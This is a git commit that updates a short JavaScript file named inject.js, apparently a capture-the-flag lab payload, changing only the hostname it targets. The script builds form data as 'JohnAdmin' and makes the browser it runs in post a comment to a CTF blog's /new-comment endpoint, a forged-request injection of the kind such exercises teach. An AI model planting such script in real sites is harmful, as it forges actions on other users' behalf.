6672bbe16a3f7276c384a2ed239f6fa7db8de4bb
Panagiotis Vasilikos <94691274+panagiotisvasilikos@users.noreply.github.com>
2023-05-05 01:59:15 +0200

    Update inject.js

--- inject.js
+++ inject.js
@@ -2,7 +2,7 @@ let formData = new FormData();
 formData.append('name', 'JohnAdmin');
 formData.append('comment', 'John123');
 
-fetch("http://blog.952e4bd6-959.ctf.one.dr.punksecurity.cloud:5000/new-comment",
+fetch("http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment",
     {
         body: formData,
         method: "post"
